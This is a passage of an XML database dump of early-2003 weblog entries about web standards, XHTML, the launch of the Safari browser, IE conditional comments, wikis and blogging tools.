&lt;p&gt;By carefully using semantic &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; to store content, I gain the ability to easily extract and process information I have created using tried and tested &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; tools. I can extract the links from an entry with a few lines of code, a technique used by my &lt;a href=&quot;http://simon.incutio.com/archive/2002/09/11/#testingPingbackClient&quot;&gt;Pingback client implementation&lt;/a&gt; for this weblog. Furthermore, should I ever decide to serve my content in a different format I can do so using simple transformation tools that have already been created and extensively tested by other developers.&lt;/p&gt;

&lt;p&gt;I agree with Brian that storing content as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; (especially presentational &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;) could turn out to be a great mistake, but semantic &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; provides a powerful and well defined format for storing content in a way that is both future proof and instantly accessible.&lt;/p&gt;</field>
		<field name="created">2003-01-06 14:00:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">687</field>
		<field name="title">Perl made less ugly</field>
		<field name="slug">perlMadeLessUgly</field>
		<field name="body">&lt;p&gt;It seems Perl &lt;acronym title=&quot;Object Oriented Programming&quot;&gt;OOP&lt;/acronym&gt; doesn't have to be &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/04/#crufty&quot;&gt;that ugly&lt;/a&gt; after all. &lt;cite&gt;Tony Bowden&lt;/cite&gt; &lt;a href=&quot;http://www.tmtm.com/nothing/archives/2003_01_05.html#000470&quot; title=&quot;Camel Poop&quot;&gt;disects&lt;/a&gt; the code from the recent Evolt article and shows how it can be made much neater using Perl's &lt;code&gt;Class::Accessor&lt;/code&gt; module. Much nicer - I should have guessed that there would be More Than One Way To Do It.&lt;/p&gt;
</field>
		<field name="created">2003-01-06 18:48:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">688</field>
		<field name="title">A great year for Mozilla</field>
		<field name="slug">aGreatYearForMozilla</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.mozillazine.org/articles/article2795.html&quot;&gt;MozillaZine Review of the Year 2002&lt;/a&gt; shows just how far the Mozilla project progressed in 2002. From a 0.9.8 milestone in January, the open source browser bounded on past version 1.0 and span off popular sub projects in Chimera and Phoenix (soon to be renamed).&lt;/p&gt;</field>
		<field name="created">2003-01-06 19:28:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">689</field>
		<field name="title">Using page titles properly</field>
		<field name="slug">usePageTitlesProperly</field>
		<field name="body">&lt;p&gt;&lt;cite&gt;Adrian Holovaty&lt;/cite&gt; &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/01/06/2300&quot; title=&quot;On bookmarking entertainment listings&quot;&gt;eloquently demonstrates&lt;/a&gt; why real page titles (as opposed to titles stuffed with meaningless marketing keywords) are so important, using local entertainment listings as his example. One site that would do well to take his advice (despite not being in the entertainments listings business) is &lt;a href=&quot;http://www.theregister.co.uk/&quot;&gt;The Register&lt;/a&gt;, which has been failing to provide story headlines in page titles for as long as I have been visiting it. This is almost certainly a flaw in their content management system, but in 2003 it is an inexcusable error to make.&lt;/p&gt;</field>
		<field name="created">2003-01-07 10:18:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">690</field>
		<field name="title">Vertical centering with CSS</field>
		<field name="slug">verticalCenteringWithCSS</field>
		<field name="body">&lt;p&gt;Lots of people said it couldn't be done (myself included), but evidently we were wrong. Joe Gillespie shows how to achieve &lt;a href=&quot;http://www.wpdfd.com/editorial/wpd0103.htm#toptip&quot;&gt;vertical centering with CSS&lt;/a&gt; in the latest edition of &lt;acronym title=&quot;Web Page Design For Designers&quot;&gt;WPDFD&lt;/acronym&gt;. Via &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_01_05_archive.shtml#87045093&quot; title=&quot;saila.com: Tuesday, January 07, 2003&quot;&gt;Craig Saila&lt;/a&gt;, who also has an &lt;a href=&quot;http://www.saila.com/attic/sandbox/set-height.html&quot; title=&quot;Set Height&quot;&gt;experimental piece&lt;/a&gt; showing how the height of three divs can be set to the height of the tallest of the three, using javascript.&lt;/p&gt;</field>
		<field name="created">2003-01-07 10:35:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">691</field>
		<field name="title">Wiki hosts and ticket stubs</field>
		<field name="slug">wikiHostsAndTicketStubs</field>
		<field name="body">&lt;p&gt;&lt;cite&gt;Matthew Haughey&lt;/cite&gt; asks why no one has launched a free host for people to set up Wikis, similar to &lt;a href=&quot;http://blogspot.com/&quot;&gt;blogspot&lt;/a&gt; for blogs or &lt;a href=&quot;http://groups.yahoo.com/&quot;&gt;Yahoo Groups&lt;/a&gt; for mailing lists / collaborative communities. It's a good question.&lt;/p&gt;
&lt;blockquote cite=&quot;http://a.wholelottanothing.org/archived.blah/01/01/03#1085&quot;&gt;&lt;p&gt;
I know wrapping your head around the idea of a wiki isn't the easiest thing (it took me many months between the first time I was exposed to one, and the time at which I found any use for them). Still, I'm surprised there isn't any sort of single community host for them. It seems like something I'd give someone five bucks a month for, to let me run a wiki that was instantaneous to sign up and get going.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;While on Matt's site, I also noticed that he has launched &lt;a href=&quot;http://stories.about.ticketstubs.org/&quot;&gt;stories.about.ticketstubs.org&lt;/a&gt;, an interesting concept site which encourages people to upload scanned images of their saved ticket stubs and tell a story about the night that the ticket stub represents.&lt;/p&gt;</field>
		<field name="created">2003-01-07 10:49:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">692</field>
		<field name="title">Spatial indexes</field>
		<field name="slug">spatialIndexes</field>
		<field name="body">&lt;p&gt;&lt;cite&gt;Jeremy Zawodny&lt;/cite&gt; demonstrates &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000418.html#000418&quot;&gt;Spatial Indexes in MySQL 4.1&lt;/a&gt;. This clever new feature allows you to add data to a table in terms of geometric points, then run queries to find (for example) all points that occur inside a specified polygon. Weird and wonderful stuff.&lt;/p&gt;</field>
		<field name="created">2003-01-07 10:54:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">693</field>
		<field name="title">Collaboration tools should be simple</field>
		<field name="slug">collaborationToolsShouldBeSimp</field>
		<field name="body">&lt;p&gt;Peter Merholtz has &lt;a href=&quot;http://peterme.com/archives/00000349.html&quot; title=&quot;2, 4, 6, 8, Let&amp;apos;s All Collaborate&quot;&gt;been thinking about&lt;/a&gt; collaborative software tools, and has concluded that the simplest are by far the most effective.&lt;/p&gt;
&lt;blockquote cite=&quot;http://peterme.com/archives/00000349.html&quot;&gt;&lt;p&gt;
This will likely frustrate the hell of out big software vendors, who want to develop over-engineered software solutions that require many servers and for which they can charge hundreds of thousands of dollars. Because, frankly, those things don't work. And these same vendors simply aren't interested in developing what does work, email applications and IM applications and web bulletin boards. And I suspect we'll see a lot of enterprise software companies go out of business, not because of a hurting economy, but simply because people realize that you can't automate unstructured collaboration, and that it's a foolish way to spend money.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Surprisingly Peter fails to mention Wikis in his list of tools that do work - and from my experience of them Wikis are one of the most flexible collaborative tools around thanks both to their simplicity and their open ended nature. The comments attached to the story mention Wikis though, and also have some interesting thoughts on &quot;direct manipulation&quot; of content and the unix model of simple tools that work reliably for their purpose.&lt;/p&gt;</field>
		<field name="created">2003-01-07 12:13:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">694</field>
		<field name="title">Pepy's diary</field>
		<field name="slug">pepysDiary</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.pepysdiary.com/&quot;&gt;Pepy's Diary&lt;/a&gt; is a serialization of the Diary of Samuel Pepys in weblog form, which launched on Christmas day plans to continue for the next ten years (the time period covered by the diary). The weblog is quickly becoming a meme, and &lt;cite&gt;Phil Gyford&lt;/cite&gt;, its creator, has written &lt;a href=&quot;http://www.gyford.com/phil/writing/2003/01/02/000124.php&quot; title=&quot;It&amp;apos;s all gone a bit Warchalking&quot;&gt;an overview&lt;/a&gt; of how publicity spread after the diary's launch. He has also written &lt;a href=&quot;http://news.bbc.co.uk/2/hi/uk_news/2621581.stm&quot; title=&quot;&amp;apos;Why I turned Pepys&amp;apos; diary into a weblog&amp;apos;&quot;&gt;a story&lt;/a&gt; for BBC News Online describing the project. I am reminded of &lt;a href=&quot;http://www.sankey.ca/caesar/&quot;&gt;Bloggus Caesari&lt;/a&gt;, a historical weblog by Julius Caesar.&lt;/p&gt;</field>
		<field name="created">2003-01-07 12:26:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">695</field>
		<field name="title">Safari surprise</field>
		<field name="slug">safariSurprise</field>
		<field name="body">&lt;p&gt;I dunno, you take the evening off to watch a daft Bond movie (Goldeneye was showing on &lt;acronym title=&quot;Independant TeleVision&quot;&gt;ITV&lt;/acronym&gt; and when you log on again the world is aflame with reports of Apple's new browser, &lt;a href=&quot;http://www.apple.com/safari/&quot;&gt;Safari&lt;/a&gt;. To everyone's surprise it's based on the KHTML engine as seen in Konqueror, rather than using Mozilla's Gecko engine. I've used Konqueror a fair bit in the past few months and it really is an excellent rendering engine (I was amazed when it rendered all of my favourite CSS layout sites flawlessly) but this is still something of a shock, especially considering Apple's recent hiring of Dave Hyatt, a key member of the Mozilla project and the guy behind the excellent Gecko-based browser &lt;a href=&quot;http://www.mozilla.org/projects/chimera/&quot;&gt;Chimera&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Mark Pilgrim appears to have &lt;a href=&quot;http://diveintomark.org/archives/2003/01/07.html#safari_review&quot; title=&quot;Safari review&quot;&gt;the most in depth review&lt;/a&gt; of the browser so far (alas I lack an Apple Mac to play with new toys like this), but coverage is also available from &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_01_05_archive.shtml#87045093&quot;&gt;Craig Saila&lt;/a&gt;, &lt;a href=&quot;http://trainedmonkey.com/week/2003/02#n1161&quot;&gt;Jim Winstead&lt;/a&gt;, &lt;a href=&quot;http://www.scottandrew.com/weblog/2003_01#a000487&quot;&gt;Scott Andrew&lt;/a&gt;, &lt;a href=&quot;http://randomfoo.net/?p=2003_01_05_archive.inc#90154278&quot;&gt;Leonard Lin&lt;/a&gt; and &lt;a href=&quot;http://www.sixapart.com/log/2003/01/initial_reactio.shtml&quot;&gt;Mena Trott&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-07 23:11:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">696</field>
		<field name="title">XHTML is still great for content</field>
		<field name="slug">xhtmlIsStillGreatForContent</field>
		<field name="body">&lt;p&gt;In repsonse to &lt;cite&gt;Mark Pilgrim&lt;/cite&gt;'s &lt;a href=&quot;http://www.diveintomark.org/archives/2003/01/05.html#poisoning_the_envelope&quot;&gt;Poisoning the envelope&lt;/a&gt;, &lt;cite&gt;Brian Donovan&lt;/cite&gt; has &lt;a href=&quot;http://www.monokromatik.com/veethree/?viewNewsItem=1&amp;amp;newsitemid=634&quot; title=&quot;More about the dead cats...&quot;&gt;expanded upon his opinion&lt;/a&gt; that long term web facing content should not be stored as (X)HTML:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.monokromatik.com/veethree/?viewNewsItem=1&amp;amp;newsitemid=634&quot;&gt;
&lt;p&gt;Do everything &quot;right&quot; (proper DTD's, validating all of your HTML, etc.) and, assuming that browser makers don't chuck backwards compatibility (about as reasonable as deciding not to pay for medical insurance because of your past track record of good health) and you will still either (1.) be locked into circa 2002 XHTML forever / until you find yourself with an extra month or two (or more) of free time and get the itch to go through several years of accumulated content to bring it up to spec or (2.) find yourself building a patchwork site because you've been incorporating recent developments as they've come along (i.e. all of the entries after 2006 use XForms where appropriate after MSIE 9, Opera 11, Moz3/NS 10 support finally solidified, but earlier entries using plain old (X)HTML forms).&lt;/p&gt;

&lt;p&gt;Patching your cms (or getting/paying a someone to do it for you) from time to time could be (by far) preferable to and cheaper than periodically hand-editing several years' worth of articles stored in HTML format.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Again, I agree with Brian's points with respect to &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. His argument fails however when you consider &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. The beautiful thing about (valid) &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; is that it can be processed by any tool capable of processing &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. No hand editing is required - if you later need to convert your content to a newer standard (and personally I see &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 1.0 as a pretty stable horse) it takes a simple &lt;acronym title=&quot;XSL Transformations&quot;&gt;XSLT&lt;/acronym&gt; stylesheet, or possibly a short Python script. You have created future proof content without having to reinvent the wheel.&lt;/p&gt;</field>
		<field name="created">2003-01-08 22:34:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">697</field>
		<field name="title">Dorothea Salo on semantic HTML</field>
		<field name="slug">dorotheaSaloOnSemanticHTML</field>
		<field name="body">&lt;p&gt;&lt;cite&gt;Dorothea Salo&lt;/cite&gt; has posted &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2003_01_05.html#e001206&quot; title=&quot;&amp;quot;Semantic HTML&amp;quot;&quot;&gt;her thoughts&lt;/a&gt; on Semantic &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; as well. Dorothea points out that while pre-defined tags (paragraphs, lists and so forth) are well defined it is easy to run in to problems when you start to define extra semantics via the class attribute. Start with something like &lt;code&gt;&amp;lt;code class=&quot;python&quot;&amp;gt;&lt;/code&gt; and the chances are that six months down the line your list of custom classes will have spiralled out of control, and as tools and validators will not be checking your class names (for typoes and so forth) you'll soon be in a whole world of trouble.&lt;/p&gt;

&lt;p&gt;Seeing as Dorothea has years of experience as a markup expert, whereas I've only been using HTML correctly since last summer, I'll take her word for it that this is a problem (it certainly makes sense). I'm not a huge fan of additional semantics via the class attribute, but if you want to expand &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; it can look like the only option. Perhaps this is where the modularisation of &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; can come in to play? &lt;cite&gt;Lachlan Cannon&lt;/cite&gt;'s &lt;a href=&quot;http://www.alistapart.com/stories/inlinexml/&quot;&gt;Inline XML&lt;/a&gt; story on &lt;acronym title=&quot;A List Apart&quot;&gt;ALA&lt;/acronym&gt; shows how namespaces can be used to embed custom &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; information in an otherwise normal &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; document, and it would be easy to build a simple &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; that could filter out this information before serving it to more simple web clients. Of course, this reintroduces the problem of having to define a custom &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; vocabulary so in some ways it puts us back where we started.&lt;/p&gt;</field>
		<field name="created">2003-01-08 22:52:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">698</field>
		<field name="title">Surfin' Safari</field>
		<field name="slug">surfinSafari</field>
		<field name="body">&lt;p&gt;Dave Hyatt has renamed his weblog &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/&quot;&gt;Surfin' Safari&lt;/a&gt; and is extensively documenting the Safari team's progress in fixing problems and making their browser even more standards compliant. He has also been responding to questions posed by the blogging community concerning the new browser. Of particular interest is &lt;a href=&quot;http://www.mozillazine.org/weblogs/hyatt/2003_01_05_mozillian_archive.html#90161490&quot; title=&quot;Safari Commentary: The UA String&quot;&gt;this post&lt;/a&gt; explaining the thinking behind Safari's controversial User Agent string (which identifies itself as &quot;like Gecko&quot;):&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.mozillazine.org/weblogs/hyatt/2003_01_05_mozillian_archive.html#90161490&quot;&gt;
&lt;p&gt;The reason it is there is that in order to work with real-world DHTML sites you have essentially two options: you can claim to be MSIE or you can claim to be Gecko. We found that any other choice that we tried led to a significant portion of DHTML malfunctioning. You would not believe (well, maybe you would) how much DHTML exists out there that works only with MSIE or Gecko, and that uses proprietary extensions of each to accomplish the DHTML effects. Had we released a browser with a UA string that did not superficially match either MSIE or Gecko, users would have downloaded Safari and experienced many malfunctioning Web sites.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;We chose to be more like Gecko than like MSIE because we wanted to be lumped into the standards compliant category, because fundamentally we are committed to supporting DOM 1&amp;amp;2, CSS1&amp;amp;2, and enough proprietary MSIE extensions and Gecko extensions (innerHTML, createContextualFragment, offsetWidth/Height, etc.) that we could be placed in a similar category.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-01-11 16:55:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">699</field>
		<field name="title">DOM2 almost recommended</field>
		<field name="slug">dom2AlmostRecommended</field>
		<field name="body">&lt;p&gt;Craig Saila &lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_01_05_archive.shtml#87170265&quot; title=&quot;Saila.com: Thursday, January 09, 2003&quot;&gt;notes&lt;/a&gt; that the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; have &lt;a href=&quot;http://www.w3.org/TR/2003/REC-DOM-Level-2-HTML-20030109/&quot; title=&quot;Document Object Model (DOM) Level 2 HTML Specification&quot;&gt;released&lt;/a&gt; &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; Level 2 as a recommendation and simultaneously recommended &lt;em&gt;against&lt;/em&gt; its use in an &lt;a href=&quot;http://news.com.com/2100-1023-979976.html&quot; title=&quot;W3C releases scripting standard, caveat&quot;&gt;article on News.com&lt;/a&gt;. Scripts should be used sparingly as they are &lt;q cite=&quot;http://news.com.com/2100-1023-979976.html&quot;&gt;less machine-readable or transparent than so-called declarative languages like SVG and SMIL&lt;/q&gt;. I'm a big advocate of the &lt;a href=&quot;http://youngpup.net/?request=/articles/labels.xml&quot; title=&quot;Labels.js: A Re-Introduction to DHTML&quot;&gt;labels.js&lt;/a&gt; school of scripting where &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; scripts are used to enhance the functionality of a document using the semantic structure of the underlying &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, while degrading gracefully (and without loss of information) in user agents without the required javascript support.&lt;/p&gt;</field>
		<field name="created">2003-01-11 17:12:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">700</field>
		<field name="title">Chat rooms and meetings</field>
		<field name="slug">chatRoomsAndMeetings</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.openp2p.com/pub/a/p2p/2002/12/26/inroom_chat.html&quot;&gt;In-Room Chat as a Social Tool&lt;/a&gt;: Clay Shirky describes an experiment with an online chat room set up to accompany a meeting of 30 people taking place in the same room. The chat room (available to attendees via Wifi laptops and displayed on a big screen at the front of the room) had some interesting effects on the dynamics of the meeting, not least of which was the dramatic impact the chat room had on the &quot;interrupt logic&quot; of the proceedings.&lt;/p&gt;</field>
		<field name="created">2003-01-11 17:28:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">701</field>
		<field name="title">Safari conditional comments</field>
		<field name="slug">safariConditionalComments</field>
		<field name="body">&lt;p&gt;The current extended discussion over whether or not Safari should have some kind of specific &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; blocking technique built in (&lt;a href=&quot;http://diveintomark.org/archives/2003/01/09.html#should_safari_be_intentionally_buggy&quot; title=&quot;Should Safari be intentionally buggy?&quot;&gt;sparked off&lt;/a&gt; by Mark Pilgrim) reminds me of a relatively unpublicised feature of Internet Explorer called &lt;a href=&quot;http://msdn.microsoft.com/workshop/author/dhtml/overview/ccomment_ovw.asp&quot;&gt;conditional comments&lt;/a&gt;. These specially crafted &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; comments allow web authors to specifically hide code from versions of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, or alternatively to hide code from any browsers that are &lt;em&gt;not&lt;/em&gt; a specified version of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;. Here's how they work:&lt;/p&gt;

&lt;pre&gt;&amp;lt;![if !IE 5]&amp;gt;
&amp;lt;p&amp;gt;This HTML only visible to non-Microsoft browsers or
IE versions older than IE 5&amp;lt;/p&amp;gt;
&amp;lt;![endif]&amp;gt;

&amp;lt;!--[if IE 5.0]&amp;gt;
&amp;lt;p&amp;gt;This HTML only visible to IE version 5&amp;lt;/p&amp;gt;
&amp;lt;![endif]--&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The downside of this approach is that it encourages ugly browser specific code to be added to the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; of a page. Adrian Holovaty's &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/01/09/2152&quot; title=&quot;Blocking stylesheet rules from Safari&quot;&gt;suggestion for Safari&lt;/a&gt; is similar but, in my opinion, more elegant as the unpleasant code is restricted to the stylesheet (I always prefer nasty hacks to stay out of the way in the stylesheet rather than rearing their ugly heads in my markup)&lt;/p&gt;</field>
		<field name="created">2003-01-11 17:41:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">702</field>
		<field name="title">Chose URLs carefully</field>
		<field name="slug">choseURLsCarefully</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ashbykuhlman.net/blog/2002/12/24/0201&quot;&gt;Name your sections carefully&lt;/a&gt; (via &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/01/09/2242&quot; title=&quot;Recommended reading&quot;&gt;Adrian&lt;/a&gt;) discusses how news (and other) sites could end up adversely affecting their content through badly chosen &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; schemes.&lt;/p&gt;</field>
		<field name="created">2003-01-11 17:45:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">703</field>
		<field name="title">Stuart's pingback roundup</field>
		<field name="slug">stuartsPingbackRoundup</field>
		<field name="body">&lt;p&gt;Stuart has a &lt;a href=&quot;http://www.kryogenix.org/days/000431.cas&quot; title=&quot;Pingbacks and trackbacks and implementation&quot;&gt;good summary&lt;/a&gt; of the recent advances being made in the Pingback/Trackback implementation sphere.&lt;/p&gt;</field>
		<field name="created">2003-01-11 17:54:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">704</field>
		<field name="title">Generated content observation</field>
		<field name="slug">generatedContentObservation</field>
		<field name="body">&lt;p&gt;Mark Pilgrim is &lt;a href=&quot;http://diveintomark.org/archives/2003/01/13.html#semantic_obsolescence&quot; title=&quot;Semantic obsolescence&quot;&gt;unhappy with XHTML 2.0&lt;/a&gt;. Since the rest of the blogging community has already provided mass commentary on his post, I'll make an observation concerning his further reading feature instead. The first link I saw to Mark's post (and the one I followed) &lt;a href=&quot;http://www.techno-weenie.com/archives/2003/01/13/&quot; title=&quot;techno weenie: January 13, 3003&quot;&gt;was on techno weenie&lt;/a&gt;, but I was surprised to later notice that techno weenie was not listed in the further reading list. For those who haven't been paying attention, Mark's further reading list is &lt;a href=&quot;http://diveintomark.org/archives/2002/04/20.html#automatic_linkbacks&quot; title=&quot;Automatic linkbacks&quot;&gt;automatically generated from referrals&lt;/a&gt;, with verification from a clever Python script that checks the source page to make sure there really is a link, extract a relevant portion of the page and attempts to find a permalink for the entry as well.&lt;/p&gt;

&lt;p&gt;Mark's system usually has a very high success rate, so why had it not picked up on the entry on techno weenie? On closer inspection of the entry in question, I noticed that the only link back to Mark's entry was the &quot;source&quot; link at the bottom of the quote. Suddenly it clicked - could Rick be using a &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; script to extract the &lt;code&gt;cite&lt;/code&gt; attribute of the &lt;code&gt;blockquote&lt;/code&gt; and display it on the page? I checked the code and, sure enough, Rick was using the script I &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/#blockquoteCitations&quot; title=&quot;Blockquote Citations&quot;&gt;published back in December&lt;/a&gt;. Mark's script looks for a &quot;real&quot; link in the page, and since the look was generated on the client side from the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; it failed to find one and assumed that the referral was invalid.&lt;/p&gt;

&lt;p&gt;There isn't really a moral to this story, I just thought it was interesting.&lt;/p&gt;

&lt;p&gt;Also spotted in Mark's further reading list, Tom Gilder has finally set himself up &lt;a href=&quot;http://tom.me.uk/blog/&quot; title=&quot;Tom&amp;apos;s Gilder Blog&quot;&gt;a blog&lt;/a&gt;. He promises lots of rants. This is a good thing.&lt;/p&gt;</field>
		<field name="created">2003-01-13 23:58:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">705</field>
		<field name="title">Blogs as agents</field>
		<field name="slug">blogsAsAgents</field>
		<field name="body">&lt;p&gt;Scott makes an interesting observation: &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/01/14.html#a1208&quot;&gt;Are blogs nothing more than agents for the internet?&lt;/a&gt;. A few years ago &quot;intelligent agents&quot; which knew your tastes and found content you would be interested in were the Next Big Thing™. Scott points out that by reading bloggers with similar tastes to us we are essentially getting the same service, with a nice human touch.&lt;/p&gt;</field>
		<field name="created">2003-01-14 23:25:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">706</field>
		<field name="title">Apple snubs Mozilla</field>
		<field name="slug">appleSnubsMozilla</field>
		<field name="body">&lt;p&gt;News.com: &lt;a href=&quot;http://news.com.com/2100-1023-980492.html&quot;&gt;Apple snub stings Mozilla&lt;/a&gt;. Surprisingly comprehensive coverage of the Mozilla communities reactions to Safari. What impressed me was the number of links to weblogs in the news story. It looks like CNET &quot;gets&quot; blogging.&lt;/p&gt;</field>
		<field name="created">2003-01-14 23:29:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">707</field>
		<field name="title">Comment back</field>
		<field name="slug">commentBack</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.dellah.com/orient/2003/01/13/up_and_down_the_ladder.shtml&quot; title=&quot;Up and down the ladder&quot;&gt;Paul Freeman&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.dellah.com/orient/2003/01/13/up_and_down_the_ladder.shtml&quot;&gt;&lt;p&gt;
Maybe one day, I’ll post a comment somewhere, and when someone responds, a CommentBack will be sent to my CommentBack server, and I can click straight to the response.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-01-14 23:31:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">708</field>
		<field name="title">The making of Python</field>
		<field name="slug">theMakingOfPython</field>
		<field name="body">&lt;p&gt;One for the reading list: &lt;a href=&quot;http://www.artima.com/intv/python.html&quot;&gt;The Making of Python&lt;/a&gt; - A conversation with Guido van Rossum, Part I.&lt;/p&gt;</field>
		<field name="created">2003-01-14 23:35:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">709</field>
		<field name="title">First deployment of Vellum</field>
		<field name="slug">firstDeploymentOfVellum</field>
		<field name="body">&lt;p&gt;Oooh... Stuart has moved &lt;a href=&quot;http://www.kryogenix.org/&quot; title=&quot;as days pass by&quot;&gt;his blog&lt;/a&gt; over to Vellum, his brand new sparkly Python powered blogging system. The full post is &lt;a href=&quot;http://www.kryogenix.org/days/378.html&quot; title=&quot;The big move to Vellum&quot;&gt;here&lt;/a&gt;, but his archive / permalinks aren't working yet. It's going to be fun watching the system develop.&lt;/p&gt;</field>
		<field name="created">2003-01-15 10:22:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">710</field>
		<field name="title">Content management gems</field>
		<field name="slug">contentManagementGems</field>
		<field name="body">&lt;p&gt;Not one, but &lt;a href=&quot;http://www.steptwo.com.au/columntwo/archives/000455.html#000455&quot; title=&quot;Three new Content Management Briefings&quot;&gt;three gems&lt;/a&gt; from James Robertson:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.steptwo.com.au/papers/cmb_future/index.html&quot;&gt;Looking towards the future of content management&lt;/a&gt; looks at the future of the &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; market over the next few years. James predicts that content management will become commoditized, resulting in vendor squeeze in an increasingly competitive market. He also mentions the possibility of the burgeoning &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; industry moving to open standards, but predicts that this could be five years away.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.steptwo.com.au/papers/cmb_metadata/index.html&quot;&gt;Putting metadata to work&lt;/a&gt; provides some neat suggestions on ways metadata collected by a &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; can be used to help in the management of a website.&lt;/li&gt;
